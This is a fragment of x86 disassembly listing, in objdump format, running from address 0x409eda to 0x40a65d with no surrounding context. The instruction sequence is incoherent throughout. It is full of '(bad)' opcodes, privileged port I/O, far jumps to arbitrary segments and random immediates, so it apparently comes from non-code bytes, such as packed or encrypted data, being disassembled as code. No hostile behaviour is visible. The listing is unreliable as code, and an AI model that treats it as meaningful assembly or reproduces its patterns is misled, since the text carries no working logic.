  409eda:	add    ch,bl
  409edc:	sub    BYTE PTR [eax],dh
  409ede:	mov    ebp,0xe7324c47
  409ee3:	in     eax,dx
  409ee4:	mov    edi,DWORD PTR [esi+0x43cf1d74]
  409eea:	inc    eax
  409eeb:	dec    ecx
  409eec:	dec    ecx
  409eed:	aam    0xd8
  409eef:	mov    ch,0x5e
  409ef1:	scas   al,BYTE PTR es:[edi]
  409ef2:	outs   dx,DWORD PTR ds:[esi]
  409ef3:	nop
  409ef4:	xchg   ecx,eax
  409ef5:	ficom  DWORD PTR [edi]
  409ef7:	sbb    ebx,0xeefa318f
  409efd:	jge    0x409f4d
  409eff:	pop    eax
  409f00:	pop    ebx
  409f01:	and    eax,0xffd30961
  409f06:	call   0x4ae32e40
  409f0b:	adc    esi,edi
  409f0d:	push   ds
  409f0e:	xchg   ebx,eax
  409f0f:	loopne 0x409f0e
  409f11:	int    0x17
  409f13:	cmp    edx,eax
  409f15:	sub    eax,0xfda12d5a
  409f1a:	fcmovbe st,st(0)
  409f1c:	xor    BYTE PTR [ebp+0x712b86c3],cl
  409f22:	mov    esp,0x8d3eb44e
  409f27:	jmp    0x2d08:0xeb05096
  409f2e:	(bad)  
  409f2f:	ficomp WORD PTR [ecx-0x67]
  409f32:	inc    edx
  409f33:	and    ch,bl
  409f35:	xor    BYTE PTR [ecx-0x7b],dh
  409f38:	mov    cl,0x11
  409f3a:	mov    edx,0x88b91102
  409f3f:	mov    esi,0xd25f0c99
  409f44:	and    cl,al
  409f46:	loope  0x409f03
  409f48:	add    ah,bh
  409f4a:	dec    edx
  409f4b:	xchg   esi,eax
  409f4c:	mov    dl,0xcb
  409f4e:	jns    0x409fbd
  409f50:	push   esp
  409f51:	fadd   st(7),st
  409f53:	or     eax,0x470cf627
  409f58:	imul   esi,DWORD PTR [ecx+edx*2],0xffffffd6
  409f5c:	std    
  409f5d:	pushf  
  409f5e:	fcomp  QWORD PTR [ecx+0x10248cdf]
  409f64:	mov    dh,0xe9
  409f66:	call   0x4f98f86
  409f6b:	push   eax
  409f6c:	mov    WORD PTR [esi-0x3c0fc6b],ds
  409f72:	fiadd  WORD PTR [edi+0x7c]
  409f75:	xor    ebp,DWORD PTR [edx+eiz*2]
  409f78:	xchg   ebx,eax
  409f79:	cmp    dl,ah
  409f7b:	pop    edi
  409f7c:	fnsave ds:0xc4c83d16
  409f82:	jecxz  0x409f35
  409f84:	mov    dh,BYTE PTR [esi]
  409f86:	push   esi
  409f87:	jecxz  0x409f86
  409f89:	xchg   esp,eax
  409f8a:	mov    ch,0xcd
  409f8c:	xor    esi,DWORD PTR [edx+0x48]
  409f8f:	adc    bl,al
  409f91:	or     BYTE PTR [ebx+0x4e],bh
  409f94:	stc    
  409f95:	jnp    0x409fc9
  409f97:	imul   edx,DWORD PTR [edi-0x4d],0x36
  409f9b:	addps  xmm7,XMMWORD PTR [eax-0x430e9c22]
  409fa2:	retf   
  409fa3:	push   ebx
  409fa4:	lods   eax,DWORD PTR ds:[esi]
  409fa5:	pop    es
  409fa6:	cwde   
  409fa7:	jge    0x409f3c
  409fa9:	test   al,0xa9
  409fab:	mov    edi,0x6560fd0c
  409fb0:	imul   ecx,edx,0x7d
  409fb3:	dec    eax
  409fb4:	pop    es
  409fb5:	lods   al,BYTE PTR ds:[esi]
  409fb6:	cmp    bl,dh
  409fb8:	mov    esp,0x4bf36cf1
  409fbd:	aas    
  409fbe:	pop    ebp
  409fbf:	(bad)
  409fc3:	pusha  
  409fc4:	mov    dl,0x1e
  409fc6:	shl    BYTE PTR ds:0x4e2c2a63,0x31
  409fcd:	ja     0x409fb0
  409fcf:	adc    DWORD PTR [ebx],ebp
  409fd1:	fs pop ds
  409fd3:	out    0x5f,al
  409fd5:	je     0x409fc7
  409fd7:	inc    eax
  409fd8:	arpl   WORD PTR [eax+0x5e94a79d],sp
  409fde:	outs   dx,BYTE PTR ds:[esi]
  409fdf:	sbb    DWORD PTR [ecx-0x1a7ed530],ecx
  409fe5:	pop    esp
  409fe6:	pop    eax
  409fe7:	pusha  
  409fe8:	mov    esp,0x293f34c0
  409fed:	out    0x2a,al
  409fef:	and    dh,BYTE PTR [ecx+ecx*8+0x5a685eb9]
  409ff6:	mov    dl,0x2a
  409ff8:	xor    al,ch
  409ffa:	retf   
  409ffb:	inc    edi
  409ffc:	test   DWORD PTR ds:0xaec3cf2,ecx
  40a002:	mov    bh,0x75
  40a004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a005:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a008:	mov    al,ds:0x6abea913
  40a00d:	and    ebx,esp
  40a00f:	sub    edx,DWORD PTR [ecx-0x5]
  40a012:	icebp  
  40a013:	sub    eax,0x81c574bc
  40a018:	div    DWORD PTR [ebx]
  40a01a:	xchg   DWORD PTR [ecx],esi
  40a01c:	push   ebx
  40a01d:	add    al,ch
  40a01f:	shl    DWORD PTR [eax-0x1c],1
  40a022:	aam    0x42
  40a024:	outs   dx,DWORD PTR ds:[esi]
  40a025:	inc    eax
  40a026:	mov    dl,bl
  40a028:	retf   0x6c2a
  40a02b:	or     ch,bh
  40a02d:	ds pop esp
  40a02f:	repz jg 0x40a01c
  40a032:	xor    al,0x9
  40a034:	sbb    eax,0x2568fc7
  40a039:	out    dx,al
  40a03a:	ret    
  40a03b:	mov    ecx,0xe8d9654f
  40a040:	mov    WORD PTR [ebp+0x61783e2a],?
  40a046:	sahf   
  40a047:	add    al,0x2d
  40a049:	or     al,0x55
  40a04b:	imul   edi,DWORD PTR [edx-0x79],0xdaa84566
  40a052:	stos   BYTE PTR es:[edi],al
  40a053:	dec    ebx
  40a054:	sbb    dh,BYTE PTR [ecx]
  40a056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a057:	inc    ecx
  40a058:	(bad)  
  40a059:	adc    al,0x5b
  40a05b:	mov    bl,ch
  40a05d:	imul   edi,DWORD PTR [edi+edx*4-0x3db49fe6],0xffffff86
  40a065:	inc    eax
  40a066:	push   es
  40a067:	pop    edx
  40a068:	sub    ecx,DWORD PTR [edx]
  40a06a:	jnp    0x40a02f
  40a06c:	push   ss
  40a06d:	mov    edx,0xc0098fa9
  40a072:	or     DWORD PTR [eax-0x65e52d90],edx
  40a078:	out    0x22,eax
  40a07a:	xor    esi,DWORD PTR [eax+edx*4]
  40a07d:	cmc    
  40a07e:	mov    BYTE PTR ds:0xb0478284,bl
  40a084:	mov    al,ds:0x18effa52
  40a089:	out    0xd7,al
  40a08b:	xchg   ebp,eax
  40a08c:	in     al,dx
  40a08d:	dec    eax
  40a08e:	inc    ebp
  40a08f:	cs and eax,0x7a044876
  40a095:	into   
  40a096:	jno    0x40a026
  40a098:	mov    bl,0x40
  40a09a:	or     eax,0xd5d6cc30
  40a09f:	dec    edi
  40a0a0:	popf   
  40a0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0a2:	or     cl,BYTE PTR [eax]
  40a0a4:	scas   al,BYTE PTR es:[edi]
  40a0a5:	rcl    BYTE PTR [edx-0x58],1
  40a0a8:	fstp   QWORD PTR [edx-0x4099c602]
  40a0ae:	and    BYTE PTR [edx],al
  40a0b0:	jb     0x40a075
  40a0b2:	aad    0xc
  40a0b4:	stos   BYTE PTR es:[edi],al
  40a0b5:	mov    bh,0x2c
  40a0b7:	ret    0x5c7c
  40a0ba:	stos   BYTE PTR es:[edi],al
  40a0bb:	add    al,0xfa
  40a0bd:	pop    ecx
  40a0be:	cmp    eax,0x26f0991d
  40a0c3:	arpl   WORD PTR [edi],sp
  40a0c5:	cmp    eax,0x7cf15acb
  40a0ca:	xchg   ecx,eax
  40a0cb:	push   ss
  40a0cc:	imul   edi,DWORD PTR [esi],0xe3712718
  40a0d2:	fcomi  st,st(4)
  40a0d4:	icebp  
  40a0d5:	xchg   ebx,eax
  40a0d6:	jns    0x40a155
  40a0d8:	cmp    DWORD PTR [ecx-0x55],ebx
  40a0db:	int    0x61
  40a0dd:	mov    edi,0x48eba307
  40a0e2:	inc    edi
  40a0e3:	sbb    BYTE PTR [eax+edi*2],bl
  40a0e6:	push   esi
  40a0e7:	jp     0x40a0c0
  40a0e9:	jp     0x40a0e8
  40a0eb:	or     al,0xc7
  40a0ed:	(bad)  
  40a0ee:	push   ss
  40a0ef:	dec    edi
  40a0f0:	inc    esi
  40a0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f2:	loope  0x40a113
  40a0f4:	in     eax,0x7a
  40a0f6:	mov    dl,0xcc
  40a0f8:	(bad)  
  40a0f9:	out    0xf,al
  40a0fb:	jo     0x40a17c
  40a0fd:	call   0x92dc:0x5fbbfa2
  40a104:	mov    cl,0xa0
  40a106:	shl    DWORD PTR ds:0x2b74a977,cl
  40a10c:	sbb    eax,0x37ad3591
  40a111:	loope  0x40a0d9
  40a113:	fwait
  40a114:	je     0x40a0f2
  40a116:	pusha  
  40a117:	into   
  40a118:	popf   
  40a119:	push   ebp
  40a11a:	add    BYTE PTR [ebx+edx*8-0x5773e3b2],dl
  40a121:	or     al,0x45
  40a123:	pop    ebx
  40a124:	and    eax,0x7b12dfba
  40a129:	and    BYTE PTR ds:0x282adb5d,cl
  40a12f:	and    BYTE PTR [ecx+0xf],cl
  40a132:	jo     0x40a0c1
  40a134:	std    
  40a135:	mov    ?,ecx
  40a137:	or     dh,BYTE PTR [esi]
  40a139:	(bad)  
  40a13a:	cmp    DWORD PTR [eax+0x16],0xf0a6587d
  40a141:	mov    ecx,0x13dce220
  40a146:	adc    DWORD PTR [ecx+ebp*4],edx
  40a149:	sub    DWORD PTR es:[ecx],ebp
  40a14c:	and    eax,0x390fc6dd
  40a151:	jb     0x40a1b5
  40a153:	dec    ebp
  40a154:	arpl   WORD PTR [edi-0x77b7e97f],cx
  40a15a:	mov    ebx,0x6cfea1c9
  40a15f:	fisubr DWORD PTR [esi+0x1ad3d901]
  40a166:	pop    ebx
  40a167:	test   eax,0xd0c1db43
  40a16c:	pop    ebx
  40a16d:	mov    ecx,0x923f99e9
  40a172:	xchg   edi,eax
  40a173:	mov    cl,0x60
  40a175:	std    
  40a176:	or     al,0xbc
  40a178:	mov    bl,0x4f
  40a17a:	(bad)  
  40a17b:	out    dx,al
  40a17c:	(bad)  
  40a17d:	test   DWORD PTR [ebp-0x5a2280d],0x3a5685a3
  40a187:	neg    dh
  40a189:	rcr    bl,1
  40a18b:	inc    esi
  40a18c:	rol    DWORD PTR [ecx],0x56
  40a18f:	in     al,0xbe
  40a191:	jne    0x40a1af
  40a193:	fstp   TBYTE PTR [eax+0x355dc35a]
  40a199:	dec    eax
  40a19a:	sti    
  40a19b:	and    BYTE PTR [ebx+0x52],al
  40a19e:	ins    BYTE PTR es:[edi],dx
  40a19f:	hlt    
  40a1a0:	pop    ebx
  40a1a1:	aad    0xcb
  40a1a3:	(bad)  
  40a1a4:	scas   al,BYTE PTR es:[edi]
  40a1a5:	loope  0x40a128
  40a1a7:	pop    edi
  40a1a8:	or     eax,0xa9f9f0c6
  40a1ad:	cmp    bh,bh
  40a1af:	xchg   DWORD PTR [ecx+ebx*4-0x188f4b8d],ecx
  40a1b6:	stos   BYTE PTR es:[edi],al
  40a1b7:	jmp    0x6534:0x53ca089b
  40a1be:	int    0x2b
  40a1c0:	xchg   ecx,eax
  40a1c1:	pop    esi
  40a1c2:	dec    edx
  40a1c3:	or     eax,0xd619baf5
  40a1c8:	pop    edi
  40a1c9:	scas   ax,WORD PTR es:[edi]
  40a1cb:	cmovle edx,DWORD PTR [esi+ecx*4+0x2fd010bc]
  40a1d3:	scas   eax,DWORD PTR es:[edi]
  40a1d4:	mov    ah,0xe4
  40a1d6:	inc    edi
  40a1d7:	mov    al,0x38
  40a1d9:	adc    BYTE PTR [ecx+0x6],dl
  40a1dc:	cmp    eax,0x118abd84
  40a1e1:	sub    eax,0x72896620
  40a1e6:	push   esi
  40a1e7:	inc    edi
  40a1e8:	xor    BYTE PTR [edx+esi*2+0x39b309df],bl
  40a1ef:	inc    eax
  40a1f0:	mov    eax,0xf06c933e
  40a1f5:	test   eax,0xab4847db
  40a1fa:	sbb    al,0x35
  40a1fc:	loop   0x40a1e9
  40a1fe:	adc    cl,ch
  40a200:	addr16 mov eax,ds:0x8650
  40a204:	cld    
  40a205:	int    0x84
  40a207:	nop
  40a208:	xor    bh,0x8b
  40a20b:	in     eax,dx
  40a20c:	mov    ch,0x9d
  40a20e:	mov    edi,0x578cef63
  40a213:	xchg   ebx,ebx
  40a215:	mov    ecx,0x1c0ca13a
  40a21a:	xchg   ecx,eax
  40a21b:	push   edi
  40a21c:	ja     0x40a19e
  40a21e:	mov    edi,0x98cfa4c4
  40a223:	add    al,0xb7
  40a225:	outs   dx,DWORD PTR ds:[esi]
  40a226:	out    0x1c,al
  40a228:	pop    ss
  40a229:	(bad)  
  40a22a:	out    dx,eax
  40a22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a22c:	xchg   edx,eax
  40a22d:	call   0xee05d9a7
  40a232:	or     eax,0xe5de9f6e
  40a237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a238:	loope  0x40a1de
  40a23a:	pop    eax
  40a23b:	inc    ebx
  40a23c:	in     eax,0x13
  40a23e:	xchg   DWORD PTR [edx+0x73],edi
  40a241:	mov    ds:0x38ba67fb,al
  40a246:	inc    ebp
  40a247:	ins    BYTE PTR es:[edi],dx
  40a248:	mov    ebp,0x61ea3833
  40a24d:	inc    ebx
  40a24e:	mov    bl,BYTE PTR [edx-0x24fa1ce]
  40a254:	inc    esi
  40a255:	jae    0x40a26e
  40a257:	mov    ch,0x73
  40a259:	jae    0x40a21c
  40a25b:	push   0x3c074e82
  40a260:	push   ecx
  40a261:	sahf   
  40a262:	sub    esi,ebp
  40a264:	(bad)  
  40a265:	sti    
  40a266:	sbb    ebx,0xb
  40a269:	mov    dl,0x5
  40a26b:	aam    0xc5
  40a26d:	aam    0xa
  40a26f:	jne    0x40a2dd
  40a271:	mov    al,0x12
  40a273:	dec    ecx
  40a274:	mov    al,0x40
  40a276:	retf   0xe6fe
  40a279:	jb     0x40a23a
  40a27b:	jnp    0x40a24d
  40a27d:	call   0x96d8:0xaf313644
  40a284:	xchg   ebx,ebx
  40a286:	out    0x6e,al
  40a288:	outs   dx,DWORD PTR ds:[esi]
  40a289:	lock sbb eax,0x66a5f42a
  40a28f:	mov    ah,0x9d
  40a291:	push   0x72
  40a293:	mov    ds:0x9c2b4dc9,eax
  40a298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a299:	fwait
  40a29a:	and    al,0xac
  40a29c:	sbb    eax,eax
  40a29e:	sub    DWORD PTR [ebp+edx*1-0xa],ebp
  40a2a2:	imul   edx,DWORD PTR [ecx],0x47
  40a2a5:	or     BYTE PTR [eax],dh
  40a2a7:	sub    BYTE PTR [esi+eax*2-0x9df11b],cl
  40a2ae:	pop    ss
  40a2af:	shr    BYTE PTR [edx-0x1f5d39ad],1
  40a2b5:	lds    esi,FWORD PTR [esi-0x48893125]
  40a2bb:	test   eax,0x5d7bcdb8
  40a2c0:	pop    edx
  40a2c1:	and    al,0x43
  40a2c3:	pushf  
  40a2c4:	test   DWORD PTR [edi-0xf],edi
  40a2c7:	aam    0x97
  40a2c9:	(bad)  
  40a2ca:	cmp    al,0xa9
  40a2cc:	lods   al,BYTE PTR ds:[esi]
  40a2cd:	add    eax,0xb714fd44
  40a2d2:	and    DWORD PTR [ecx+0x1d7f3255],esp
  40a2d8:	sti    
  40a2d9:	lods   eax,DWORD PTR ds:[esi]
  40a2da:	mov    BYTE PTR [ebx+0x75],al
  40a2dd:	inc    esi
  40a2de:	pop    edi
  40a2df:	and    eax,ebp
  40a2e1:	lods   al,BYTE PTR ds:[esi]
  40a2e2:	std    
  40a2e3:	mov    ebp,0x4ec38ccf
  40a2e8:	sub    BYTE PTR [ebp+edi*4+0x5771944d],cl
  40a2ef:	mov    ds:0x7fe8674,eax
  40a2f4:	jmp    0x7e8e367a
  40a2f9:	push   0xffffffe6
  40a2fb:	and    edi,DWORD PTR [ecx+0x60]
  40a2fe:	std    
  40a2ff:	lock or esi,eax
  40a302:	mov    ds:0x5d0a9103,al
  40a307:	push   es
  40a308:	pop    es
  40a309:	(bad)  
  40a30a:	cmp    DWORD PTR [edi],eax
  40a30c:	loope  0x40a313
  40a30e:	mov    cl,0xc
  40a310:	mov    dl,0x5
  40a312:	pop    es
  40a313:	mov    dl,0x6c
  40a315:	pop    esi
  40a316:	push   ebx
  40a317:	and    BYTE PTR [esi],bh
  40a319:	mov    al,0x76
  40a31b:	and    BYTE PTR ds:0x60a7dae4,ch
  40a321:	mov    eax,0x2d684388
  40a326:	gs push esp
  40a328:	addr16 cld 
  40a32a:	sub    ebp,DWORD PTR [ecx+0x25702f5c]
  40a330:	scas   al,BYTE PTR es:[edi]
  40a331:	outs   dx,DWORD PTR ds:[esi]
  40a332:	bound  ebx,QWORD PTR [eax+0x75]
  40a335:	in     eax,0x1a
  40a337:	lds    edx,FWORD PTR [esi+0x3a79214b]
  40a33d:	sbb    BYTE PTR [ebp+0x3d3a72ba],bl
  40a343:	pop    es
  40a344:	cmp    eax,0xc5627336
  40a349:	adc    dh,BYTE PTR [ebx-0x80]
  40a34c:	cmp    dl,al
  40a34e:	and    al,0xde
  40a350:	inc    esi
  40a351:	xchg   ebp,eax
  40a352:	add    ah,bh
  40a354:	hlt    
  40a355:	xchg   esp,eax
  40a356:	mov    esi,0x4090e676
  40a35b:	ins    DWORD PTR es:[edi],dx
  40a35c:	adc    eax,0xbbd87540
  40a361:	jp     0x40a32e
  40a363:	out    dx,al
  40a364:	jns    0x40a386
  40a366:	pop    esp
  40a367:	sbb    esi,DWORD PTR [esi]
  40a369:	(bad)  
  40a36a:	cld    
  40a36b:	loop   0x40a3e2
  40a36d:	outs   dx,DWORD PTR ds:[esi]
  40a36e:	add    edi,ecx
  40a370:	mov    bl,0x95
  40a372:	cmp    edi,DWORD PTR [ebp+eax*1+0x3863054c]
  40a379:	(bad)  
  40a37a:	int    0x5b
  40a37c:	push   cs
  40a37d:	aam    0xc5
  40a37f:	mov    ?,WORD PTR [edi-0x66]
  40a382:	add    al,0x4c
  40a384:	sar    BYTE PTR [esi-0x2bcca97c],cl
  40a38a:	mov    esi,0xd43da17f
  40a38f:	out    dx,eax
  40a390:	sbb    DWORD PTR [edi-0x7eb3f3a0],esi
  40a396:	cdq    
  40a397:	add    dh,BYTE PTR [edx+ebp*1]
  40a39a:	ds jnp 0x40a41a
  40a39d:	pop    esi
  40a39e:	sub    BYTE PTR [ebx-0x42],bl
  40a3a1:	call   0xc7647a34
  40a3a6:	scas   al,BYTE PTR es:[edi]
  40a3a7:	or     BYTE PTR [eax-0xc],dl
  40a3aa:	nop
  40a3ab:	mov    bh,0x92
  40a3ad:	in     al,0x5a
  40a3af:	fs out 0xb9,al
  40a3b2:	dec    edi
  40a3b3:	and    ebp,DWORD PTR [eax-0x76]
  40a3b6:	sbb    esp,DWORD PTR [ebx-0x600e6a7a]
  40a3bc:	xchg   esi,edi
  40a3be:	adc    al,al
  40a3c0:	ficomp DWORD PTR [esi]
  40a3c2:	inc    ebx
  40a3c3:	popa   
  40a3c4:	test   edi,edx
  40a3c6:	out    dx,al
  40a3c7:	xor    al,0xaa
  40a3c9:	pusha  
  40a3ca:	shr    DWORD PTR [edi+0x68cacf42],1
  40a3d0:	xor    ah,bh
  40a3d2:	out    dx,al
  40a3d3:	cmp    bl,BYTE PTR gs:[ecx-0x1a]
  40a3d7:	mov    ds:0x2cdf52f5,eax
  40a3dc:	inc    ebp
  40a3dd:	lea    ebx,[edx-0x54]
  40a3e0:	xchg   edx,eax
  40a3e1:	mov    fs:0x8a1b0f47,eax
  40a3e7:	push   es
  40a3e8:	fwait
  40a3e9:	retf   0x7d54
  40a3ec:	push   ecx
  40a3ed:	inc    edi
  40a3ee:	xor    bl,al
  40a3f0:	mov    WORD PTR [ecx+0x67],ss
  40a3f3:	or     cl,BYTE PTR [ebp-0x2c]
  40a3f6:	in     eax,0x33
  40a3f8:	push   edx
  40a3f9:	xor    al,0x3e
  40a3fb:	outs   dx,BYTE PTR ds:[esi]
  40a3fc:	sub    al,0xbb
  40a3fe:	es push edx
  40a400:	test   edi,ebp
  40a402:	push   cs
  40a403:	in     eax,dx
  40a404:	scas   al,BYTE PTR es:[edi]
  40a405:	pop    ebp
  40a406:	inc    esp
  40a407:	sti    
  40a408:	adc    eax,0xa0204315
  40a40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40e:	loope  0x40a447
  40a410:	pop    ebp
  40a411:	leave  
  40a412:	out    dx,eax
  40a413:	ret    0x81db
  40a416:	cmp    eax,DWORD PTR [ebx+0x7f]
  40a419:	into   
  40a41a:	pop    ecx
  40a41b:	les    ebp,FWORD PTR [eax]
  40a41d:	adc    BYTE PTR [eax+0x64],0xb8
  40a421:	sub    BYTE PTR [eax],cl
  40a423:	arpl   WORD PTR [ebx],cx
  40a425:	shl    DWORD PTR [ebx],cl
  40a427:	sbb    BYTE PTR [edx+0x2b6b2b25],0xc1
  40a42e:	mov    ebx,0xe3489aab
  40a433:	inc    esi
  40a434:	pop    ebx
  40a435:	xchg   esp,eax
  40a436:	xor    eax,0x829a209
  40a43b:	ror    DWORD PTR [esp+edx*1-0x41],cl
  40a43f:	push   0xffffffed
  40a441:	iret   
  40a442:	xchg   ebp,eax
  40a443:	sahf   
  40a444:	dec    ebx
  40a445:	or     al,0x9a
  40a447:	dec    edx
  40a448:	ja     0x40a460
  40a44a:	in     al,dx
  40a44b:	and    esi,0xffffffb9
  40a44e:	pop    esp
  40a44f:	dec    ebp
  40a450:	xlat   BYTE PTR ds:[ebx]
  40a451:	add    BYTE PTR [ecx+0x77],bh
  40a454:	aad    0x9a
  40a456:	mov    esi,0xea8f8a24
  40a45b:	ss jge 0x40a464
  40a45e:	lock rcl BYTE PTR [eax],cl
  40a461:	outs   dx,BYTE PTR ds:[esi]
  40a462:	lock mov esp,0xc0f0e97f
  40a468:	fistp  WORD PTR [ebx]
  40a46a:	mov    ebx,DWORD PTR [edi-0x62ade99b]
  40a470:	scas   eax,DWORD PTR es:[edi]
  40a471:	clc    
  40a472:	inc    ebx
  40a473:	int3   
  40a474:	inc    ecx
  40a475:	jmp    0x40a449
  40a477:	repz mov ebx,0x5158c802
  40a47d:	(bad)  
  40a47e:	cmp    eax,DWORD PTR [edx+0x6d8f65d1]
  40a484:	ins    BYTE PTR es:[edi],dx
  40a485:	dec    edx
  40a486:	pop    ss
  40a487:	ss je  0x40a47b
  40a48a:	push   ebp
  40a48b:	mov    bh,dh
  40a48d:	xor    dh,BYTE PTR [ebp+0x71]
  40a490:	or     eax,0xab3e3535
  40a495:	mov    ah,0x14
  40a497:	sub    ch,BYTE PTR [eax-0x11]
  40a49a:	outs   dx,BYTE PTR ds:[esi]
  40a49b:	mov    cl,0x7e
  40a49d:	aad    0x73
  40a49f:	xor    al,0x68
  40a4a1:	xor    BYTE PTR [ecx],al
  40a4a3:	sbb    al,0x19
  40a4a5:	jmp    0x3e63:0x4aeb8260
  40a4ac:	mov    BYTE PTR [ebp-0x7d],ch
  40a4af:	mov    esi,0xc8cff580
  40a4b5:	fs mov esi,0x66f6aa2c
  40a4bb:	addr16 pop esi
  40a4bd:	hlt    
  40a4be:	pop    edi
  40a4bf:	ins    BYTE PTR es:[edi],dx
  40a4c0:	jo     0x40a49c
  40a4c2:	fldcw  WORD PTR [edx-0x49]
  40a4c5:	sub    eax,0x1c07fe8
  40a4ca:	mov    ah,dh
  40a4cc:	pop    edi
  40a4cd:	dec    edi
  40a4ce:	ja     0x40a4fa
  40a4d0:	add    ah,BYTE PTR [ebp+0x63]
  40a4d3:	xor    bl,BYTE PTR [eax-0x2b163d1]
  40a4d9:	jl     0x40a4a9
  40a4db:	dec    ebp
  40a4dc:	ins    BYTE PTR es:[edi],dx
  40a4dd:	js     0x40a52b
  40a4df:	adc    al,0xd9
  40a4e1:	add    DWORD PTR es:[ecx+0xc6c27b3],esp
  40a4e8:	mov    ecx,0x29e6317f
  40a4ed:	fiadd  DWORD PTR [esi]
  40a4ef:	or     BYTE PTR [ebp-0x5054cf05],al
  40a4f5:	xor    BYTE PTR [edx+0x5],ah
  40a4f8:	mov    esi,0xa0ae4e72
  40a4fd:	adc    DWORD PTR [edi-0x65ee86d],edx
  40a503:	imul   ebp,DWORD PTR [eax],0xad48b72a
  40a509:	ins    DWORD PTR es:[edi],dx
  40a50a:	jmp    0x40a559
  40a50c:	and    DWORD PTR cs:[edx-0x5bb3e693],edi
  40a513:	xor    al,dl
  40a515:	inc    esp
  40a516:	inc    eax
  40a517:	imul   edx,DWORD PTR [ecx],0x6fd2a67f
  40a51d:	stos   DWORD PTR es:[edi],eax
  40a51e:	fild   DWORD PTR [edi]
  40a520:	sbb    BYTE PTR [ecx+0x28],bh
  40a523:	jl     0x40a57d
  40a525:	or     bh,BYTE PTR [edi+0x73d843aa]
  40a52b:	sub    ebx,esp
  40a52d:	les    ebx,FWORD PTR [ebx]
  40a52f:	mov    cl,0xa
  40a531:	mov    al,gs:0xc5126a42
  40a537:	sbb    eax,0x170bfa0d
  40a53c:	arpl   WORD PTR [ecx],bx
  40a53e:	sub    al,0x99
  40a540:	pop    edi
  40a541:	cld    
  40a542:	push   cs
  40a543:	cmp    BYTE PTR [eax-0x6c],al
  40a546:	mov    eax,ds:0x71707efa
  40a54b:	lds    ebx,FWORD PTR [edi]
  40a54d:	push   cs
  40a54e:	mov    eax,0x60b2c13d
  40a553:	cmp    BYTE PTR [ebx-0x62],bl
  40a556:	cmp    al,0xb9
  40a558:	ds dec edx
  40a55a:	xchg   esi,eax
  40a55b:	mov    edi,0x8858cd88
  40a560:	test   ecx,ebx
  40a562:	leave  
  40a563:	dec    edx
  40a564:	mov    ebp,0xd8b05a40
  40a569:	les    edx,FWORD PTR [edi-0x3a5134d5]
  40a56f:	iret   
  40a570:	pop    eax
  40a571:	inc    ebx
  40a572:	xchg   ecx,eax
  40a573:	adc    DWORD PTR [ebx+eiz*4+0x5d],0xaa5709f0
  40a57b:	(bad)  
  40a57c:	addr16 aam 0x87
  40a57f:	fwait
  40a580:	jb     0x40a5a8
  40a582:	mov    ebp,0x7c8404d
  40a587:	lds    ebx,FWORD PTR [edx+0x7012513e]
  40a58d:	cld    
  40a58e:	into   
  40a58f:	mov    dl,0x24
  40a591:	cmp    edi,DWORD PTR [ebx]
  40a593:	neg    BYTE PTR [edx]
  40a595:	or     BYTE PTR [ebx],ch
  40a597:	push   eax
  40a598:	mov    edi,0x39f367e6
  40a59d:	test   DWORD PTR [edx+esi*4-0x21],esi
  40a5a1:	icebp  
  40a5a2:	xor    DWORD PTR [edi+0x34e71812],edi
  40a5a8:	ret    0x5833
  40a5ab:	xlat   BYTE PTR ds:[ebx]
  40a5ac:	push   edi
  40a5ad:	fcmovu st,st(5)
  40a5af:	sbb    BYTE PTR [edi],ch
  40a5b1:	jle    0x40a5e4
  40a5b3:	div    cl
  40a5b5:	test   BYTE PTR [edx-0x10],0x17
  40a5b9:	repz mov dl,bl
  40a5bc:	jae    0x40a59d
  40a5be:	outs   dx,DWORD PTR ds:[esi]
  40a5bf:	lods   al,BYTE PTR ds:[esi]
  40a5c0:	xchg   BYTE PTR [ebx],dh
  40a5c2:	and    DWORD PTR [esi-0x10],edi
  40a5c5:	js     0x40a55e
  40a5c7:	push   ebx
  40a5c8:	dec    esi
  40a5c9:	jecxz  0x40a5d5
  40a5cb:	sub    BYTE PTR [edi+0x58],ah
  40a5ce:	fdiv   st,st(7)
  40a5d0:	inc    esi
  40a5d1:	jge    0x40a652
  40a5d3:	lds    esp,FWORD PTR [ecx]
  40a5d5:	ss jno 0x40a605
  40a5d8:	cs dec edi
  40a5da:	sbb    dh,bl
  40a5dc:	loop   0x40a648
  40a5de:	and    BYTE PTR [edx+ebx*2-0x68],cl
  40a5e2:	pop    esp
  40a5e3:	aas    
  40a5e4:	cmp    DWORD PTR ds:0x39a7f105,ecx
  40a5ea:	jbe    0x40a594
  40a5ec:	fnstcw WORD PTR [edi-0x564638a0]
  40a5f2:	xchg   esp,eax
  40a5f3:	mov    al,0xbb
  40a5f5:	jecxz  0x40a65f
  40a5f7:	das    
  40a5f8:	pop    ebp
  40a5f9:	mov    esp,0x7071c82a
  40a5fe:	inc    esp
  40a5ff:	clc    
  40a600:	mov    ax,ds:0x30649f0b
  40a606:	sub    bh,BYTE PTR [edx]
  40a608:	daa    
  40a609:	mov    bl,0x8c
  40a60b:	or     eax,0x57fbab08
  40a610:	ret    
  40a611:	mov    ds:0xaa0a03b3,al
  40a616:	inc    esi
  40a617:	cmp    al,0x36
  40a619:	scas   al,BYTE PTR es:[edi]
  40a61a:	adc    edi,esi
  40a61c:	sub    eax,0xb9949448
  40a621:	stc    
  40a622:	fidiv  WORD PTR [eax+0x3c]
  40a625:	mov    edi,0xfedace81
  40a62a:	popf   
  40a62b:	test   eax,0x374a9875
  40a630:	je     0x40a648
  40a632:	cli    
  40a633:	and    cl,BYTE PTR [esi+0x41323d56]
  40a639:	test   bh,ah
  40a63b:	mov    al,ds:0x66c2d405
  40a640:	pop    esp
  40a641:	fist   DWORD PTR [ecx+0x6a14a17f]
  40a647:	push   ds
  40a648:	cmp    eax,0x3579abec
  40a64d:	into   
  40a64e:	or     DWORD PTR [eax+eax*4-0x62],edx
  40a652:	xor    ecx,DWORD PTR [edi+0x71e759b9]
  40a658:	sub    eax,0xa12b07cc
  40a65d:	jg     0x40a64e
